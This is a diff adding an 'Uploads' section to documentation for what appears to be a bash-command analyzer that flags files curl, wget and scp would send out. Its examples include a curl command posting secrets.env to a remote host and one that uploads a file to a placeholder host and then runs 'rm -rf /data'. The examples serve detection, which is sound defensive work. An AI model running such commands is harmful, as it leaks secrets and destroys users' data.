@@ -176,6 +176,30 @@ Fd duplications (`2>&1`), here-documents, and here-strings name no file and are
 omitted. `path` is `null` when the target is computed (`> $out`), which, for a
 mount-boundary check, means "ask".
 
+## Uploads
+
+A network command can send a local file without any redirect: `curl -d
+@secrets.env https://…` reads the file itself. `uploads` lists the local files
+that `curl`, `wget`, and `scp` would send, so a host can show "this will upload
+`/data/weather.csv`" in the prompt:
+
+```python
+analysis = bash.analyze("curl -d @/data/weather.csv https://x.test && rm -rf /data")
+analysis.uploads[0].command   # "curl"
+analysis.uploads[0].option    # "-d"
+analysis.uploads[0].path      # "/data/weather.csv"
+```
+
+Covered: `curl -d @f`, `--data @f`, `--data-binary @f`, `--data-ascii @f`,
+`--json @f`, `--data-urlencode [name]@f`, `-F name=@f` / `name=<f`, `-T f`;
+`wget --post-file f` / `--body-file f`; `scp` sources when the last operand is
+remote (`host:path`). Bundled short options (`-sSd@f`) and wrappers (`sudo
+curl …`, `env A=1 curl …`) are seen through. `@-` and `-` (stdin) are skipped.
+A computed value (`-d "$payload"`) reports `path: null`, which means "ask".
+
+Like the rest of analysis this is advisory. The network allowlist is what
+actually stops data from leaving; `uploads` only makes the prompt honest.
+
 ## Known gap: wrapper commands
 
 Commands that run *other* commands named in their arguments, `xargs`, `env`,
